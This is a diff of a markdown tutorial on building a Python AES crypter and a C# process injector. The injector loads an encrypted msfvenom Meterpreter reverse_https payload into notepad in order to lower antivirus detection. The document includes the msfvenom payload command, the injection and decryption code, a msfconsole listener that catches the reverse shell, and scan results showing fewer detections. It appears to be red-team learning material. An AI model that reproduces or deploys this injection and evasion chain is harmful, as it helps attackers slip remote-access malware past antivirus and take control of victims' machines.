@@ -2,13 +2,13 @@
 
 ## Overview
 
-We will create a simple python3 Crypter. The script will take raw shell code, in hex string format and encrypt it with AES encryption. The encrypted shell code will finally be encoded into a base64 string, ready to be used in a C# process injection executable, as a proof of concept.
+We will create a simple python3 Crypter. The script will take raw shell code, in hex string format and encrypt it with AES encryption. The encrypted shell code will finally be encoded into a base64 string, ready to be used in a C# process injection executable.
 
-In this example, we will aim to reduce our detection rate on [AntiScan.me](https://antiscan.me/). We will use a basic process injection technique, by calling native DLLs with P/Invoke. This technique is not advanced and will not completely bypass antivirus detection, but it should show reductions in detection rates.
+In this example, we will aim to reduce our detection rate on [AntiScan.me](https://antiscan.me/). To start we will use a basic process injection technique, by calling native DLLs with P/Invoke. This technique is not advanced and will not completely bypass antivirus detection, but it should show reductions in detection rates, when we encrypt the shell code.
 
 ## The C# Process Injector
 
-The C# code aims to inject shellcode into the notepad.exe process. It uses P/Invoke to call functions from the kernel32.dll. We call OpenProcess(), VirtualAllockEx(), WriteProcessMemory() and CreateRemoteThread().
+The C# code aims to inject shellcode into the notepad process. It uses P/Invoke to call functions from the kernel32.dll. We call OpenProcess(), VirtualAllockEx(), WriteProcessMemory() and CreateRemoteThread().
 
 ```csharp
 [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
@@ -27,11 +27,10 @@ static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttribut
 The shell code was created with msfvenom and sits inside the main function in the buf byte array.
 ```csharp
 // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.33 LPORT=443 EXITFUNC=thread -f csharp
-byte[] buf = new byte[685] {
-0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
+byte[] buf = new byte[685] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 }
 ```
 
-The rest of the code then gets the process name that we wan't to inject into. OpenProcess then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepads virtual address space, executing the shell code.
+The code, then uses GetprocessesByName and retrives an array of process components. The OpenProcess function, then gets a handle to the requested process, in this case it's notepad. VirtualAllocEx, allocates memory in the notepad process, along with the type of memory and sets the memory protection to 'PAGE_EXECUTE_READWRITE' (0x40). WriteProcessMemory then writes the shell code contained inside the buf byte array, into the allocated memory. CreateRemoteThread, then creates a thread that runs in notepads virtual address space, executing the shell code.
 
 ```csharp
 Process processName = Process.GetProcessesByName("notepad")[0];
@@ -46,7 +45,7 @@ IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero,
 
 ## Current Detection rate
 
-We build this C# code and uploaded to [AntiScan.me](https://antiscan.me/). The results show that our code is detected by 10/26 of the antivirus scans performed. We can now create the python3 Crypter and try to lower this detection rate.
+We build this C# code and upload it to [AntiScan.me](https://antiscan.me/). The results show that our code is detected by 10/26 of the antivirus scans performed on it. We can now create the python3 Crypter and try to lower this detection rate.
 
 ![Image](initial-scan.png)
 
@@ -54,11 +53,17 @@ We build this C# code and uploaded to [AntiScan.me](https://antiscan.me/). The r
 
 ### Code Overview 
 
-The Python code will take one argument. The argument determines the encryption type to be used. The script will then run a hard coded msfvenom, system command via python subprocess. The output from the msfvenom command is then encrypted via the chosen encryption type. The last function in the script will encode the encrypted bytes into a base64 string, ready to be used with the C# Process Injection application.
+The Python code will take one argument. The argument determines the encryption type to be used (We can then add different encryption types later). The script will then run a hard coded msfvenom command, via python subprocess. The output from the msfvenom command is then encrypted via the chosen encryption type. The last function in the script will encode the encrypted bytes into a base64 string, ready to be used with the previous C# Process Injection application.
 
 ## Getting Our Msfvenom Shell Code 
 
-The first function will simply run a command and save the output to a variable named 'output'. This variable will be returned. For the msfvenom command, we will use a format type of HEX, as this will generate a raw hex string. We will add EXITFUNC of thread, as this runs the shellcode in a sub-thread and gives us a clean exit when closing the connection. 
+The first function, will simply run a command and save the output to a variable named 'output', the variable will be returned and assigned to the data variable (Start of the script calls shell_format(). 
+
+```python
+data = shell_format()
+```
+
+For the msfvenom command inside shell_format(), we will use a format type of hex, as this will generate a raw hex string. We will add EXITFUNC of thread, as this runs the shellcode in a sub-thread and gives us a clean exit when closing the connection. 
 
 ```python
 def shell_format():
@@ -72,14 +77,19 @@ def shell_format():
 
 ## Encrypting The Shell Code
 
-With our returned hex shell code (output), we will call the function 'aes_encrypt_shellcode(data)' and pass the msfvenom command output as data. The following function will assemble the pieces needed to encrypt our data variable.
+With our returned hex shell code (output.stdout), we will call the function 'aes_encrypt_shellcode(data)' and pass the msfvenom command as data. The following function will assemble the pieces needed to encrypt our data variable.
 
-The function will create two random 16 byte numbers. The first named IV ([Initialization vector](https://en.wikipedia.org/wiki/Initialization_vector)) and second named key ([Encryption Key](https://en.wikipedia.org/wiki/Key_cryptography))). The two variables are needed to create our cipher.
+```python
+data = shell_format()
+aes_encrypt_shellcode(data)
+```
+
+The aes_encrypt_shellcode() function, will create two random 16 byte numbers. The first named IV ([Initialization vector](https://en.wikipedia.org/wiki/Initialization_vector)) and second named key ([Encryption Key](https://en.wikipedia.org/wiki/Key_cryptography))). The two variables are needed to create our cipher.
 
 Padding is then added to the data, as we are using AES.MODE_CBC. From there, the cipher_create() function is called, 
 along with the three arguments of key,padded and IV. Once the cipher_create() function encrypts the data, it returns it to the 'encrypted_data' variable.
 
-The last line in the function calls the aes_encrypt_shellcode() function and sends the encrypted_data, IV and key to be encoded.
+The last line in the aes_encrypt_shellcode() function, calls the aes_encrypt_shellcode() function and sends the encrypted_data, IV and key to be encoded.
 
 
 ```python
@@ -109,7 +119,7 @@ def cipher_create(key,shellcode,IV):
 
 ## Encoding Our Encrypted Data
 
-The final part of the script will encode the three arguments passed from the aes_encrypt_shellcode() function. The function simply uses the base64.b64encode() function, with our chosen data as an argument and a variable name for the returning encoded data.
+The final part of the script, will encode the three arguments passed from the aes_encrypt_shellcode() function. The function simply uses the base64.b64encode() function, with our chosen data as an argument and a variable name for the returning encoded data, that is then printed to the linux terminal.
 
 ```python
 def base64_encode(encrypted_data, IV, key):
@@ -124,6 +134,8 @@ def base64_encode(encrypted_data, IV, key):
     encoded = base64.b64encode(encrypted_data)
     print(f"[>] Shell Code: {encoded.decode('utf-8')}")
 ```
+
+## Testing The Script On Kali Linux
 
 Running the script we get our msfvenom, generated shellcode,  the IV ([Initialization vector](https://en.wikipedia.org/wiki/Initialization_vector)) and the key ([Encryption Key](https://en.wikipedia.org/wiki/Key_(cryptography))) all in base64 encoded strings.
 
@@ -145,7 +157,7 @@ string IV64 = "rrCbahc3bgSFAZAmL/dHZA==";
 byte[] IV = Convert.FromBase64String(IV64);
 ```
 
-With the conversion of the base64 strings complete, wew can now decrypt the AES encrypted data. The code below creates a  string variable named plaintext, this will hold our decrypted shell code. The rest of the code can be seen at the docs.microsoft pages, under the [Aes Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-6.0)
+With the conversion of the base64 strings complete, wew can now decrypt the AES encrypted data. The code below creates a string variable named 'plaintext', this will hold our decrypted shell code. The rest of the code can be seen at the docs.microsoft pages, under the [Aes Class](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-6.0)
 
 ```csharp
 // DecryptStringFromBytes_Aes(shellBytes, Key, IV);
@@ -176,16 +188,16 @@ using (Aes aesAlg = Aes.Create())
 }
 ```
 
-With the shell hex code assigned to the 'plaintext' string variable, we must now convert this string to a byte array, two hex characters at a time. We create a byte array named happyEnd, half the size of the plaintext string. We then add two characters from the string, to a list, from the list, we add each element to our happyEnd byte array and convert them to bytes.
+With the shell code, as a hex string, now assigned to the 'plaintext' string variable, we must convert this string to a byte array, two hex characters at a time. We create a byte array named happyEnd, half the size of the plaintext string. We then take two characters from the string and add them to a list. Then from that list, we add each element to our happyEnd byte array and convert them to bytes.
 
 ```csharp
 // Create byte array, half size of decrypted data
 byte[] happyEnd = new byte[plaintext.Length / 2];
-
+// Create a list, add two chars at a time.
 var res = new List<string>();
 for (int i = 0; i < plaintext.Length; i += 2)
     res.Add(plaintext.Substring(i, 2));
-
+// Convert each element to bytes.
 for (int i = 0; i < happyEnd.Length; i++)
 {
     //Console.WriteLine(res[i].ToString());
@@ -213,19 +225,19 @@ Uploading the new C# injector, we see that the detection rate has dropped signif
 
 ![encoded](aes-scan.png)
 
-## Getting A Reverse Shell On The Target
+## Getting A Shell On The Target Machine
 
-To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener, with the following command.
+To test that the InjectAes.exe functions correctly, we first set up a msfconsole listener on Kali linux, with the following command. The listener will wait for the incoming connection, from shell code that was executed on the target machine (The C# Process Injecton).
 
 ```
 sudo msfconsole -q -x "use exploit/multi/handler/; set PAYLOAD windows/x64/meterpreter/reverse_https; set LHOST eth0; set LPORT 443; run
 ```
 
-Once the listener is set up, we must start a notepad process on the target system. Just before we execute the InjectAes.exe, we can confirm notepads PID in powershell. With the PID in hand, we then execute the InjectAes.exe file on the target system.
+Once the listener is set up, we must start a notepad process on the target system. Just before we execute the InjectAes.exe on the target, we can confirm notepads PID in powershell, we will use this to confirm our shellcode was injected. With the PID in hand, we then execute the InjectAes.exe file on the target system.
 
 ![execute](execute.png)
 
-We catch the connection in msfconsole and confirm the PID. We now have a terminal connection to the target system.
+We catch the connection in kali linux, using msfconsole. We can then confirm the PID is the same as on the target. We now have a terminal connection to the target system.
 
 ![catch](catch-shell.png)
 
@@ -237,8 +249,9 @@ This has worked well, but is far from a complete solution in terms of trying to 
 
 ### References to source code
 
+[C# Aes Code](https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-6.0)  
+[Python Aes Code](https://www.suls.co.uk/slae-assignment-7-custom-crypter/)
 
----
 
-
+---  
 ---
